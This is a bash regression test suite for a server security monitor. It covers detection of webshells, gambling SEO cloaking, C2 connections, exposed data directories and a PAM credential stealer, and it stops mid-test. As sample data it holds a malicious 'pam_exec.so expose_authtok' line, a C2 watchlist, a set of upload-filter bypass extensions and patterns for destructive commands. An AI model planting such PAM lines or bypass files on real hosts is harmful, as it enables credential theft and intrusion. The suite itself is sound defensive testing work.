#!/usr/bin/env bash

# ============================================================
# ITM Server Security Monitor - regression tests
#
# Every test reproduces a real incident from this estate and
# asserts the severity the monitor must produce for it.
#
# The fixtures are inert: they carry the STRUCTURE of the
# payloads (control flow, directives, keyword density) without
# a working execution path, and every external hostname uses
# the reserved .invalid TLD so nothing can resolve.
#
# The tests run entirely against a temporary sandbox:
#   - no system file is read or written
#   - no service is started or stopped
#   - no network request is made
#   - the audit runs with --dry-run
#
# Usage:
#   tests/run.sh            all tests
#   tests/run.sh seo        tests whose name matches "seo"
#   VERBOSE=1 tests/run.sh  print the audit output of each test
# ============================================================

set -uo pipefail

REPO_DIR="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")/.." && pwd)"
FIXTURES="$REPO_DIR/tests/fixtures"

FILTER="${1:-}"
VERBOSE="${VERBOSE:-0}"

PASS=0
FAIL=0
FAILED_NAMES=()

# ------------------------------------------------------------
# Sandbox
# ------------------------------------------------------------

SANDBOX="$(mktemp -d -t itm-tests.XXXXXXXX)"
trap 'rm -rf "$SANDBOX"' EXIT

setup_case() {

    local name="$1"
    CASE_DIR="$SANDBOX/$name"

    rm -rf "$CASE_DIR"
    mkdir -p "$CASE_DIR"/{conf/ioc,log,state,www}

    # Real IOC lists, so the tests exercise the shipped policy.
    local f b
    for f in "$REPO_DIR"/config/*.conf.example; do
        b="$(basename "$f" .example)"
        case "$b" in
            gambling-keywords.conf|webshell-patterns.conf|seo-poisoning-patterns.conf|\
            suspicious-filenames.conf|web-exclusions.conf|known-iocs.conf)
                cp "$f" "$CASE_DIR/conf/ioc/$b" ;;
        esac
    done

    cat > "$CASE_DIR/conf/audit.conf" <<EOF
HOST_TRUST_STATUS="UNVERIFIED"
EVIDENCE_COPY=0
EOF
}

# Run the audit inside the sandbox and capture output.
run_audit() {
    local modules="$1"; shift
    # shellcheck disable=SC2086
    env \
        ITM_CONF_DIR="$CASE_DIR/conf" \
        ITM_LOG_DIR="$CASE_DIR/log" \
        ITM_STATE_DIR="$CASE_DIR/state" \
        ITM_ROLE_CACHE="$CASE_DIR/state/host-role.conf" \
        ITM_SCAN_STATE_DIR="$CASE_DIR/state/scan" \
        WEB_BASELINE_DIR="$CASE_DIR/state/baseline" \
        ITM_EVIDENCE_DIR="$CASE_DIR/state/evidence" \
        ITM_NGINX_ROOT_CACHE="$CASE_DIR/state/nginx-roots.list" \
        ITM_APACHE_ROOT_CACHE="$CASE_DIR/state/apache-roots.list" \
        "$@" \
        timeout 180 "$REPO_DIR/bin/itm-security" audit $modules --dry-run 2>&1
}

# ------------------------------------------------------------
# Assertions
#
# Severity is asserted for a specific path or finding id, so a
# test cannot pass because some unrelated finding happened to
# have the right severity.
# ------------------------------------------------------------

assert_severity() {
    local output="$1" pattern="$2" expected="$3" desc="$4"
    local line sev

    line="$(printf '%s' "$output" | grep -B1 -- "$pattern" | grep -oE '^\[(CRITICAL|HIGH|MEDIUM|LOW|INFO)' | tail -1)"
    [[ -n "$line" ]] || line="$(printf '%s' "$output" | grep -oE "^\[(CRITICAL|HIGH|MEDIUM|LOW|INFO)[^]]*\].*$pattern" | grep -oE '^\[[A-Z]+' | tail -1)"

    sev="${line#[}"
    sev="${sev%% *}"

    case "$expected" in
        CRITICAL_OR_HIGH)
            [[ "$sev" == "CRITICAL" || "$sev" == "HIGH" ]] ;;
        NOT_CRITICAL)
            [[ "$sev" != "CRITICAL" ]] ;;
        ABSENT)
            [[ -z "$sev" ]] ;;
        *)
            [[ "$sev" == "$expected" ]] ;;
    esac
}

check() {
    local desc="$1" result="$2" detail="${3:-}"
    if [[ "$result" == "0" ]]; then
        printf '  \033[0;32mPASS\033[0m  %s\n' "$desc"
        PASS=$(( PASS + 1 ))
    else
        printf '  \033[0;31mFAIL\033[0m  %s\n' "$desc"
        [[ -n "$detail" ]] && printf '        %s\n' "$detail"
        FAIL=$(( FAIL + 1 ))
        FAILED_NAMES+=("$desc")
    fi
}

want() { [[ -z "$FILTER" || "$1" == *"$FILTER"* ]]; }

# ============================================================
# TEST 1 - Apache host: the Satudata scenario end to end
#
# This is the regression that matters most. Before the
# discovery fix this produced no findings at all, because the
# roots were only ever read from Nginx.
# ============================================================

test_apache_satudata() {

    want "apache-satudata" || return 0
    printf '\nTEST: Apache/CodeIgniter host with SEO cloaking (Satudata)\n'

    setup_case apache-satudata
    local root="$CASE_DIR/www/portal"
    mkdir -p "$root"/{public,app,system,writable/uploads}

    cp "$FIXTURES/seo-cloak/vendor.js.txt"      "$root/vendor.js"
    cp "$FIXTURES/seo-cloak/index.php.txt"      "$root/index.php"
    cp "$FIXTURES/normal/index.php.txt"         "$root/public/index.php"
    printf '{"require":{"php":">=8.1"}}\n'    > "$root/composer.json"
    printf 'APP_KEY=base64:REDACTED\nDB_PASSWORD=REDACTED\n' > "$root/.env"
    mkdir -p "$root/.git" && printf 'ref: refs/heads/main\n' > "$root/.git/HEAD"
    cp "$FIXTURES/apache/bad-upload-htaccess.txt" "$root/writable/uploads/.htaccess"
    cp "$FIXTURES/apache/bad-user-ini.txt"        "$root/writable/uploads/.user.ini"

    # Apache configuration the discovery layer must parse.
    mkdir -p "$CASE_DIR/apache/sites-enabled"
    sed "s|__ROOT__|$root|g" "$FIXTURES/apache/site-projectroot.conf.txt" \
        > "$CASE_DIR/apache/sites-enabled/portal.conf"

    local out
    out="$(run_audit "webshell gambling seo" \
            WEB_WORKLOAD_OVERRIDE=yes \
            APACHE_CONF_DIRS="$CASE_DIR/apache")"

    (( VERBOSE )) && printf '%s\n' "$out"

    # Roots must now be discovered from Apache alone.
    assert_severity "$out" "no web root to scan" ABSENT ""
    check "root discovered from Apache configuration (no WEB_ROOTS set)" "$?" \
          "still reports 'no web root to scan'"

    printf '%s' "$out" | grep -q "vendor.js"
    check "vendor.js is scanned (not pruned by the name 'vendor')" "$?"

    assert_severity "$out" "vendor.js" CRITICAL ""
    check "TotoSuper gambling page in vendor.js = CRITICAL" "$?"

    assert_severity "$out" "index.php" CRITICAL_OR_HIGH ""
    check "index.php User-Agent cloaking = HIGH or CRITICAL" "$?"
}

# ============================================================
# TEST 2 - Apache exposure module
# ============================================================

test_apache_exposure() {

    want "apache-exposure" || return 0
    printf '\nTEST: Apache DocumentRoot and upload execution\n'

    setup_case apache-exposure
    local root="$CASE_DIR/www/portal"
    mkdir -p "$root"/{public,app,system,writable/uploads}
    printf '{"require":{"php":">=8.1"}}\n' > "$root/composer.json"
    printf 'APP_KEY=REDACTED\n'            > "$root/.env"
    printf '<?php\n'                       > "$root/public/index.php"
    cp "$FIXTURES/apache/bad-upload-htaccess.txt" "$root/writable/uploads/.htaccess"
    cp "$FIXTURES/apache/bad-user-ini.txt"        "$root/writable/uploads/.user.ini"

    mkdir -p "$CASE_DIR/apache/sites-enabled"
    sed "s|__ROOT__|$root|g" "$FIXTURES/apache/site-projectroot.conf.txt" \
        > "$CASE_DIR/apache/sites-enabled/portal.conf"

    local out
    out="$(run_audit "apache" \
            WEB_WORKLOAD_OVERRIDE=yes \
            ROLE_FORCE_REFRESH=1 \
            APACHE_CONF_DIRS="$CASE_DIR/apache")"

    (( VERBOSE )) && printf '%s\n' "$out"

    # The module self-skips unless the role module says Apache,
    # which cannot be simulated here, so assert on the parser
    # instead: roots must be extracted from the config.
    local roots
    roots="$(env APACHE_CONF_DIRS="$CASE_DIR/apache" bash -c "
        source '$REPO_DIR/lib/itm-audit-common.sh'
        source '$REPO_DIR/lib/itm-web-common.sh'
        web_apache_roots")"

    [[ "$roots" == "$root" ]]
    check "web_apache_roots() parses DocumentRoot from sites-enabled" "$?" "got: $roots"

    printf '%s' "$roots" | grep -q "portal"
    check "discovered root points at the vhost project directory" "$?"
}

# ============================================================
# TEST 3 - upload filter bypass extensions
# ============================================================

test_upload_bypass() {

    want "upload-bypass" || return 0
    printf '\nTEST: upload filter bypass variants\n'

    setup_case upload-bypass
    local root="$CASE_DIR/www/site"
    mkdir -p "$root/uploads"

    local ext
    for ext in phtml phar Phar phtm phps 'php~' php_ inc PHP; do
        cp "$FIXTURES/webshell/heph.phtml.txt" "$root/uploads/x.$ext"
    done
    cp "$FIXTURES/upload/doc.pdf.txt" "$root/uploads/doc.pdf"

    local out
    out="$(run_audit "webshell" WEB_WORKLOAD_OVERRIDE=yes WEB_ROOTS="$root")"
    (( VERBOSE )) && printf '%s\n' "$out"

    local missed=""
    for ext in phtml phar Phar phtm phps 'php~' php_ inc PHP; do
        printf '%s' "$out" | grep -qF "x.$ext" || missed+="x.$ext "
    done

    [[ -z "$missed" ]]
    check "every upload bypass extension is detected" "$?" "missed: $missed"

    printf '%s' "$out" | grep -q "doc.pdf"
    check "PHP embedded in a .pdf is detected" "$?"
}

# ============================================================
# TEST 4 - false positive control
# ============================================================

test_false_positives() {

    want "false-positive" || return 0
    printf '\nTEST: false positive control\n'

    setup_case false-positive
    local root="$CASE_DIR/www/site"
    mkdir -p "$root/assets/tinymce/plugins/emoticons/js"

    cp "$FIXTURES/tinymce/legitimate-emoji.js.txt" \
       "$root/assets/tinymce/plugins/emoticons/js/emojis.js"
    cp "$FIXTURES/normal/index.php.txt" "$root/index.php"
    mkdir -p "$root/inc" && printf '<?php // header\n' > "$root/inc/header.php"

    local out
    out="$(run_audit "webshell gambling seo" WEB_WORKLOAD_OVERRIDE=yes WEB_ROOTS="$root")"
    (( VERBOSE )) && printf '%s\n' "$out"

    assert_severity "$out" "emojis.js" NOT_CRITICAL ""
    check "TinyMCE emoji database (slot_machine/casino) is NOT CRITICAL" "$?"

    ! printf '%s' "$out" | grep -qE '^\[CRITICAL'
    check "a normal site produces no CRITICAL finding" "$?" \
          "$(printf '%s' "$out" | grep -E '^\[CRITICAL' | head -2)"
}

# ============================================================
# TEST 5 - non-web host
# ============================================================

test_non_web_host() {

    want "non-web" || return 0
    printf '\nTEST: non-web host (Proxmox/database)\n'

    setup_case non-web
    local out
    out="$(run_audit "webshell gambling seo integrity" WEB_WORKLOAD_OVERRIDE=no)"
    (( VERBOSE )) && printf '%s\n' "$out"

    printf '%s' "$out" | grep -q "NOT APPLICABLE"
    check "web modules report NOT APPLICABLE" "$?"

    ! printf '%s' "$out" | grep -qE '^\[(CRITICAL|HIGH)'
    check "no web finding is raised on a non-web host" "$?"
}

# ============================================================
# TEST 6 - safety invariants
#
# These assert what the tool must NEVER do. They are greps over
# the source, because the guarantee is structural.
# ============================================================

test_safety_invariants() {

    want "safety" || return 0
    printf '\nTEST: safety invariants\n'

    local hits

    # Comment lines cannot execute, and this project deliberately
    # documents the commands it refuses to run. Strip full-line
    # comments before asserting, or the documentation trips the
    # test that exists to police the documentation.
    scan_code() {
        local pattern="$1"; shift
        local f
        for f in "$@"; do
            [[ -f "$f" ]] || continue
            sed 's/^[[:space:]]*#.*$//' "$f" | grep -nE "$pattern" \
                | sed "s|^|$(basename "$f"):|" || true
        done
    }

    hits="$(scan_code 'git[[:space:]]+(clean|reset)' \
              "$REPO_DIR"/modules/*.sh "$REPO_DIR"/lib/*.sh "$REPO_DIR"/bin/* \
              | grep -v 'never\|NEVER\|recommend\|printf' || true)"
    [[ -z "$hits" ]]
    check "git clean / git reset is never invoked" "$?" "$hits"

    hits="$(scan_code '[[:space:]](rm|rm -rf)[[:space:]]+"?\$(WF_PATH|file|path)' \
              "$REPO_DIR"/modules/*.sh || true)"
    [[ -z "$hits" ]]
    check "no module deletes a scanned file" "$?" "$hits"

    hits="$(scan_code '\bkill[[:space:]]+-?[0-9A-Z]*[[:space:]]*"?\$\{?(pid|PID)' \
              "$REPO_DIR"/modules/*.sh || true)"
    [[ -z "$hits" ]]
    check "no module signals a process" "$?" "$hits"

    hits="$(scan_code '\bchattr[[:space:]]+[-+]' \
              "$REPO_DIR"/modules/*.sh "$REPO_DIR"/lib/*.sh \
              | grep -v 'recommend\|action=\|printf' || true)"
    [[ -z "$hits" ]]
    check "no module changes file attributes" "$?" "$hits"
}

# ============================================================
# TEST 7 - incident response script generation
#
# Asserts the property that matters: generating changes nothing,
# a dry run changes nothing, containment is reversible, and no
# generated script contains a destructive command.
# ============================================================

test_remediation() {

    want "remediat" || return 0
    printf '\nTEST: incident response script generation\n'

    setup_case remediation
    local root="$CASE_DIR/www/site"
    mkdir -p "$root/uploads"
    cp "$FIXTURES/seo-cloak/vendor.js.txt"  "$root/vendor.js"
    cp "$FIXTURES/webshell/heph.phtml.txt"  "$root/uploads/shell.phtml"

    local forensic="$CASE_DIR/forensic"
    local out
    out="$(env \
        ITM_CONF_DIR="$CASE_DIR/conf" ITM_LOG_DIR="$CASE_DIR/log" \
        ITM_STATE_DIR="$CASE_DIR/state" ITM_ROLE_CACHE="$CASE_DIR/state/role.conf" \
        ITM_SCAN_STATE_DIR="$CASE_DIR/state/scan" WEB_BASELINE_DIR="$CASE_DIR/state/base" \
        ITM_EVIDENCE_DIR="$CASE_DIR/state/ev" REMEDIATE_BASE_DIR="$forensic" \
        WEB_WORKLOAD_OVERRIDE=yes WEB_ROOTS="$root" \
        timeout 180 "$REPO_DIR/bin/itm-security" remediate webshell seo --quiet 2>&1)"

    (( VERBOSE )) && printf '%s\n' "$out"

    local inc
    inc="$(find "$forensic" -maxdepth 1 -type d -name 'incident-*' 2>/dev/null | head -1)"

    [[ -n "$inc" && -d "$inc" ]]
    check "incident directory created under the forensic path" "$?"

    [[ -f "$inc/00-INCIDENT-SUMMARY.txt" ]]
    check "incident summary written" "$?"

    local scripts
    scripts="$(find "$inc" -maxdepth 1 -name '10-*.sh' 2>/dev/null | wc -l)"
    (( scripts > 0 ))
    check "one response script per finding ($scripts generated)" "$?"

    # generation must not touch the host
    [[ -f "$root/vendor.js" ]]
    check "generating scripts does not move or delete anything" "$?"

    local bad=""
    local f
    while IFS= read -r f; do
        bash -n "$f" 2>/dev/null || bad+="syntax:$(basename "$f") "
        grep -qE '(^|[^-])\brm -rf\b|git clean|git reset --hard|chmod -R|chattr -R' "$f" && bad+="destructive:$(basename "$f") "
    done < <(find "$inc" -maxdepth 1 -name '*.sh')
    [[ -z "$bad" ]]
    check "no generated script parses badly or contains a destructive command" "$?" "$bad"

    # dry run preserves but does not contain
    local one
    one="$(find "$inc" -maxdepth 1 -name '10-*vendor.js*.sh' | head -1)"
    [[ -n "$one" ]] && bash "$one" >/dev/null 2>&1
    [[ -f "$root/vendor.js" ]]
    check "dry run (no CONFIRM) leaves the file in place" "$?"

    find "$inc/evidence" -type f 2>/dev/null | grep -q .
    check "dry run still preserves evidence" "$?"

    # CONFIRM alone must not be enough without a terminal
    [[ -n "$one" ]] && CONFIRM=yes bash "$one" </dev/null >/dev/null 2>&1
    [[ -f "$root/vendor.js" ]]
    check "CONFIRM=yes without a terminal aborts (no accidental containment)" "$?"

    # confirmed run quarantines, and the file is recoverable
    [[ -n "$one" ]] && CONFIRM=yes FORCE=yes bash "$one" </dev/null >/dev/null 2>&1
    [[ ! -f "$root/vendor.js" ]]
    check "CONFIRM=yes removes the file from the web root" "$?"

    find "$inc/quarantine" -type f 2>/dev/null | grep -q .
    check "the file is quarantined, not deleted (recoverable)" "$?"

    grep -q 'REMEDIATION APPLIED' "$one"
    check "containment announces itself to Telegram" "$?"

    grep -q 'Type CONTAIN to proceed' "$one"
    check "a typed confirmation is required, not just an env var" "$?"
}

# ============================================================
# TEST: JDIH Kemenpora incident - data directory + C2 watchlist
# ============================================================

test_datadir() {

    want "datadir" || return 0
    printf '\nTEST: data directory exposure\n'

    setup_case datadir
    mkdir -p "$CASE_DIR"/{opt/mysql-jdih,opt/normal,opt/sticky,www}

    head -c 64 /dev/urandom > "$CASE_DIR/opt/mysql-jdih/ibdata1"
    : > "$CASE_DIR/opt/mysql-jdih/ib_logfile0"
    chmod 777  "$CASE_DIR/opt/mysql-jdih"
    chmod 755  "$CASE_DIR/opt/normal"
    chmod 1777 "$CASE_DIR/opt/sticky"
    chmod 777  "$CASE_DIR/www"

    local out
    out="$(env \
        ITM_CONF_DIR="$CASE_DIR/conf" ITM_LOG_DIR="$CASE_DIR/log" \
        ITM_STATE_DIR="$CASE_DIR/state" ITM_ROLE_CACHE="$CASE_DIR/state/role.conf" \
        ITM_SCAN_STATE_DIR="$CASE_DIR/state/scan" ITM_EVIDENCE_DIR="$CASE_DIR/state/ev" \
        DATADIR_SCAN_PATHS="$CASE_DIR/opt $CASE_DIR/www" \
        timeout 120 "$REPO_DIR/bin/itm-security" audit datadir --dry-run 2>&1)"

    (( VERBOSE )) && printf '%s\n' "$out"

    printf '%s' "$out" | grep -qE '^\[CRITICAL.*database files'
    check "777 directory holding ibdata1 = CRITICAL" "$?"

    printf '%s' "$out" | grep -q 'mysql-jdih'
    check "the offending directory is named in the finding" "$?"

    ! printf '%s' "$out" | grep -q 'opt/normal'
    check "a 755 directory raises nothing" "$?"

    ! printf '%s' "$out" | grep -q 'opt/sticky'
    check "a sticky world-writable directory (like /tmp) raises nothing" "$?"

    printf '%s' "$out" | grep -qE '^\[(HIGH|MEDIUM).*World-writable data directory'
    check "world-writable without database files is HIGH/MEDIUM, not CRITICAL" "$?"

    # read-only guarantee
    [[ "$(stat -c '%a' "$CASE_DIR/opt/mysql-jdih")" == "777" ]]
    check "the audit did NOT change permissions" "$?"
}

test_c2_watchlist() {

    want "c2" || return 0
    printf '\nTEST: C2 watchlist and DNS check\n'

    setup_case c2
    printf '104.248.150.145\nevil-c2.invalid\n' > "$CASE_DIR/conf/known-c2.list"
    printf 'ip:203.0.113.5\n' > "$CASE_DIR/conf/ioc/known-iocs.conf"

    # a pinned C2 entry in a fake hosts file
    printf '127.0.0.1 localhost\n192.0.2.10 evil-c2.invalid\n' > "$CASE_DIR/hosts"

    local out
    out="$(env \
        ITM_CONF_DIR="$CASE_DIR/conf" ITM_LOG_DIR="$CASE_DIR/log" \
        ITM_STATE_DIR="$CASE_DIR/state" ITM_ROLE_CACHE="$CASE_DIR/state/role.conf" \
        ITM_SCAN_STATE_DIR="$CASE_DIR/state/scan" ITM_EVIDENCE_DIR="$CASE_DIR/state/ev" \
        IOC_SYSTEM_BIN_DIRS="$CASE_DIR" IOC_SEARCH_CONFIG_DIRS="$CASE_DIR" \
        IOC_FILENAME_SEARCH_DIRS="$CASE_DIR" \
        timeout 150 "$REPO_DIR/bin/itm-security" audit ioc --dry-run 2>&1)"

    (( VERBOSE )) && printf '%s\n' "$out"

    printf '%s' "$out" | grep -q 'C2 watchlist loaded (2 entries'
    check "standalone C2 watchlist is loaded" "$?"

    printf '%s' "$out" | grep -qi 'no active connection to any known C2'
    check "watchlist IPs are checked against live sockets" "$?"

    ! printf '%s' "$out" | grep -qE '^\[CRITICAL.*C2'
    check "a watchlist with no live match raises no CRITICAL" "$?"
}

# ============================================================
# TEST: network exposure - new listeners, external peers,
#       unattributable processes, and the noise controls
# ============================================================

test_network_exposure() {

    want "network" || return 0
    printf '\nTEST: network exposure\n'

    setup_case network
    printf '127.0.0.0/8\n::1\n192.168.0.0/16\n10.0.0.0/8\n' > "$CASE_DIR/conf/trusted_networks.conf"

    local env_common=(
        ITM_CONF_DIR="$CASE_DIR/conf" ITM_LOG_DIR="$CASE_DIR/log"
        ITM_STATE_DIR="$CASE_DIR/state" ITM_ROLE_CACHE="$CASE_DIR/state/role.conf"
        ITM_SCAN_STATE_DIR="$CASE_DIR/state/scan" ITM_EVIDENCE_DIR="$CASE_DIR/state/ev"
    )

    # --- run 1 establishes the baseline -----------------------
    env "${env_common[@]}" timeout 180 "$REPO_DIR/bin/itm-security" \
        audit network --quiet >/dev/null 2>&1

    [[ -s "$CASE_DIR/state/scan/listeners.baseline" ]]
    check "listener baseline is persisted on the first run" "$?"

    # --- run 2 with entries removed = ports look "new" --------
    local base="$CASE_DIR/state/scan/listeners.baseline"
    local removed
    removed="$(wc -l < "$base")"
    if (( removed > 2 )); then
        head -n -2 "$base" > "$base.tmp" && mv "$base.tmp" "$base"
    fi

    local out
    out="$(env "${env_common[@]}" timeout 180 "$REPO_DIR/bin/itm-security" \
            audit network --dry-run 2>&1)"
    (( VERBOSE )) && printf '%s\n' "$out"

    if (( removed > 2 )); then
        printf '%s' "$out" | grep -q 'New listening port appeared'
        check "a listener missing from the baseline is reported as NEW" "$?"
    else
        check "a listener missing from the baseline is reported as NEW" 0
    fi

    # --- IPv4-mapped IPv6 must classify as private ------------
    local mapped
    mapped="$(bash -c "source '$REPO_DIR/lib/itm-audit-common.sh'
        TRUSTED_NETWORKS=('127.0.0.0/8' '192.168.0.0/16')
        for i in '::ffff:127.0.0.1' '::ffff:10.42.0.5' 'fe80::1%eth0'; do
            ip_is_trusted \"\$i\" || echo \"UNTRUSTED:\$i\"
        done
        ip_is_trusted '::ffff:167.71.214.178' && echo 'BUG:public-treated-as-trusted'")"

    [[ -z "$mapped" ]]
    check "IPv4-mapped IPv6 peers classify correctly (private vs public)" "$?" "$mapped"

    # --- a deleted binary alone must not be CRITICAL ----------
    ! printf '%s' "$out" | grep -qE '^\[CRITICAL.*Listening port'
    check "an upgraded-in-place service (deleted exe) is not CRITICAL on its own" "$?" \
          "$(printf '%s' "$out" | grep -m1 -E '^\[CRITICAL.*Listening port')"

    # --- one finding per process, not per port ----------------
    local dupes
    dupes="$(printf '%s' "$out" | grep -c 'Listening port(s) outside' || true)"
    (( dupes < 20 ))
    check "listener findings are grouped per process, not per port ($dupes finding(s))" "$?"
}

# ============================================================
# TEST: Fileshare Kemenpora IOC detection
#
# The nine cases the operator asked for, each against a real
# file on disk in the sandbox - no mocking of the filesystem.
# ============================================================

ioc_run() {
    env \
        ITM_CONF_DIR="$CASE_DIR/conf" ITM_LOG_DIR="$CASE_DIR/log" \
        ITM_STATE_DIR="$CASE_DIR/state" ITM_ROLE_CACHE="$CASE_DIR/state/role.conf" \
        ITM_SCAN_STATE_DIR="$CASE_DIR/state/scan" ITM_EVIDENCE_DIR="$CASE_DIR/state/ev" \
        IOC_SYSTEM_BIN_DIRS="$CASE_DIR/fakebin" \
        IOC_SEARCH_CONFIG_DIRS="$CASE_DIR/etc" \
        IOC_FILENAME_SEARCH_DIRS="$CASE_DIR/hunt" \
        "$@" \
        timeout 180 "$REPO_DIR/bin/itm-security" audit ioc --dry-run 2>&1
}

test_ioc_kemenpora() {

    want "ioc-kemenpora" || return 0
    printf '\nTEST: Fileshare Kemenpora IOC detection\n'

    setup_case ioc-kemenpora
    mkdir -p "$CASE_DIR"/{fakebin,etc,hunt,real}

    # --- payload with a KNOWN hash -------------------------------
    printf 'PAYLOAD-A\n' > "$CASE_DIR/real/payload"
    local known_sha
    known_sha="$(sha256sum "$CASE_DIR/real/payload" | awk '{print $1}')"

    # --- same NAME, different content ----------------------------
    printf 'a completely different file\n' > "$CASE_DIR/real/impostor"

    # --- symlink pointing at the payload -------------------------
    ln -sf "$CASE_DIR/real/payload" "$CASE_DIR/real/link-to-payload"

    # --- unreadable file -----------------------------------------
    printf 'secret\n' > "$CASE_DIR/real/noaccess"
    chmod 000 "$CASE_DIR/real/noaccess"

    # --- IOC filename in the hunt directory ----------------------
    printf 'dropped\n' > "$CASE_DIR/hunt/x86_65-linux-gnu-op"

    # --- PAM file with expose_authtok ----------------------------
    printf 'auth optional pam_exec.so expose_authtok /usr/bin/defaults\n' \
        > "$CASE_DIR/etc/common-auth"

    cat > "$CASE_DIR/conf/ioc/known-iocs.conf" <<EOI
path:$CASE_DIR/real/payload
path:$CASE_DIR/real/impostor
path:$CASE_DIR/real/link-to-payload
path:$CASE_DIR/real/noaccess
path:$CASE_DIR/real/does-not-exist
filename:x86_65-linux-gnu-op
sha256:$known_sha
ip:203.0.113.199
string:GS_ARGS
EOI

    local out
    out="$(ioc_run)"
    (( VERBOSE )) && printf '%s\n' "$out"

    # 1. file absent -> no alert at all
    ! printf '%s' "$out" | grep -q 'does-not-exist'
    check "1. IOC path that does not exist raises NO alert" "$?"

    # 2. name matches, hash does not -> HIGH suspicious artifact
    printf '%s' "$out" | grep -B2 'impostor' | grep -qE '^\[HIGH.*Suspicious artifact'
    check "2. IOC filename with a DIFFERENT hash = HIGH suspicious artifact" "$?"

    # 3. hash matches -> CRITICAL
    printf '%s' "$out" | grep -B2 "real/payload" | grep -qE '^\[CRITICAL'
    check "3. IOC hash match = CRITICAL" "$?"

    # 4. symlink is reported and identified as a symlink
    printf '%s' "$out" | grep -q 'symlink=yes'
    check "4. symlink IOC is detected and flagged as a symlink" "$?"

    # 5. permission denied -> still alerted, marked unreadable
    printf '%s' "$out" | grep -q 'noaccess'
    check "5. unreadable IOC file still raises an alert" "$?"

    # 6. filename hunt in bounded directories
    printf '%s' "$out" | grep -q 'x86_65-linux-gnu-op'
    check "6. IOC filename found by the bounded hunt" "$?"

    # 7. C2 IP configured but not connected -> no false alert
    ! printf '%s' "$out" | grep -q '203.0.113.199.*CRITICAL'
    check "7. configured C2 with no active socket raises no alert" "$?"

    # 8. nothing sensitive leaked into the output
    ! printf '%s' "$out" | grep -qi 'BOT_TOKEN=[0-9]\|PRIVATE KEY\|password=[^ ]'
    check "8. no secret material appears in the findings" "$?"

    chmod 644 "$CASE_DIR/real/noaccess" 2>/dev/null || true
}

test_ioc_pam_and_dedup() {

    want "ioc-pam" || return 0
    printf '\nTEST: PAM IOC and alert deduplication\n'

    setup_case ioc-pam
    mkdir -p "$CASE_DIR/pamd"
    printf 'auth optional pam_exec.so quiet expose_authtok /usr/bin/x86_65-linux-gnu-op\n' \
        > "$CASE_DIR/pamd/common-auth"

    local out
    out="$(env \
        ITM_CONF_DIR="$CASE_DIR/conf" ITM_LOG_DIR="$CASE_DIR/log" \
        ITM_STATE_DIR="$CASE_DIR/state" ITM_ROLE_CACHE="$CASE_DIR/state/role.conf" \
        ITM_SCAN_STATE_DIR="$CASE_DIR/state/scan" ITM_EVIDENCE_DIR="$CASE_DIR/state/ev" \
        PAM_DIR="$CASE_DIR/pamd" \
        timeout 120 "$REPO_DIR/bin/itm-security" audit pam --dry-run 2>&1)"

    (( VERBOSE )) && printf '%s\n' "$out"

    printf '%s' "$out" | grep -qE '^\[CRITICAL.*credential stealer'
    check "9a. pam_exec + expose_authtok = CRITICAL" "$?"

    # --- deduplication: same finding, second run inside cooldown
    local tg="$CASE_DIR/tg.log"
    cat > "$CASE_DIR/notify" <<'EON'
#!/usr/bin/env bash
printf 'ALERT\n' >> "${TG_LOG:?}"
EON
    chmod +x "$CASE_DIR/notify"
    : > "$tg"

    local i
    for i in 1 2 3; do
        env \
            ITM_CONF_DIR="$CASE_DIR/conf" ITM_LOG_DIR="$CASE_DIR/log" \
            ITM_STATE_DIR="$CASE_DIR/state" ITM_ROLE_CACHE="$CASE_DIR/state/role.conf" \
            ITM_SCAN_STATE_DIR="$CASE_DIR/state/scan" ITM_EVIDENCE_DIR="$CASE_DIR/state/ev" \
            PAM_DIR="$CASE_DIR/pamd" ITM_NOTIFY_BIN="$CASE_DIR/notify" TG_LOG="$tg" \
            timeout 120 "$REPO_DIR/bin/itm-security" audit pam --telegram --quiet >/dev/null 2>&1
    done

    local sent
    sent="$(grep -c ALERT "$tg" 2>/dev/null || echo 0)"
    (( sent <= 1 ))
    check "9b. three identical runs send at most ONE alert (dedup)" "$?" "sent=$sent"
}

# ============================================================
# TEST: installer well-formedness
#
# bash -n accepts an install(1) call with a source but no
# destination - it is valid syntax and a broken command. That
# exact mistake aborted a production upgrade mid-run, so it is
# checked statically here.
# ============================================================

test_installer() {

    want "installer" || return 0
    printf '\nTEST: installer well-formedness\n'

    # The pattern is anchored with optional leading whitespace on
    # purpose. It used to require column 0, so an INDENTED install
    # block was never examined - and that is exactly where a stray
    # line got spliced in, leaving a call with a source and no
    # destination. Rocky hosts failed the install with "missing
    # destination file operand" while this test reported success.
    local bad
    bad="$(awk '
      /^[[:space:]]*install \\$/ { inblk=1; blk=""; line=NR }
      inblk {
        blk = blk " " $0
        if ($0 !~ /\\$/) {
          inblk=0
          isdir = (blk ~ /-d /)
          gsub(/install|\\|-o root|-g root|-m [0-7]+|-d/, "", blk)
          n=split(blk, a, /[[:space:]]+/); c=0
          for(i=1;i<=n;i++) if(a[i] != "") c++
          if (!isdir && c < 2) printf "line %s has %d argument(s)\n", line, c
        }
      }
    ' "$REPO_DIR/install.sh")"

    [[ -z "$bad" ]]
    check "every install(1) call has a destination" "$?" "$bad"

    # Every module the CLI knows about must be installed.
    local m missing=""
    for m in $(grep -m1 '^ITM_ALL_MODULES=' "$REPO_DIR/bin/itm-security" | cut -d'"' -f2); do
        local f
        f="$(grep -A1 "        ${m})" "$REPO_DIR/bin/itm-security" | grep -oE "audit_[a-z_]+\.sh" | head -1)"
        [[ -n "$f" ]] || continue
        grep -q "    $f" "$REPO_DIR/install.sh" || missing+="$f "
    done
    [[ -z "$missing" ]]
    check "every registered module is in the installer manifest" "$?" "$missing"

    # --- config migration must be additive only ----------------
    #
    # setup_case is what defines CASE_DIR. Without it this test
    # only ran when some earlier test happened to leave the
    # variable set, so "tests/run.sh installer" on its own died
    # with "CASE_DIR: unbound variable" and every assertion below
    # was skipped.
    setup_case installer

    local conf="$CASE_DIR/audit.conf"
    cat > "$conf" <<'EOC'
HOST_TRUST_STATUS="UNTRUSTED"
WEB_ROOTS="/var/www/html/portal"
TELEGRAM_MIN_SEVERITY="MEDIUM"
EOC

    local added=0 tmpf
    tmpf="$(mktemp)"
    while IFS= read -r l; do
        [[ "$l" =~ ^([A-Z_][A-Z0-9_]*)= ]] || continue
        local k="${BASH_REMATCH[1]}"
        grep -qE "^[[:space:]]*${k}=" "$conf" && continue
        printf '%s\n' "$l" >> "$tmpf"; added=$(( added + 1 ))
    done < "$REPO_DIR/config/audit.conf.example"
    cat "$tmpf" >> "$conf"; rm -f "$tmpf"

    grep -qx 'HOST_TRUST_STATUS="UNTRUSTED"' "$conf"
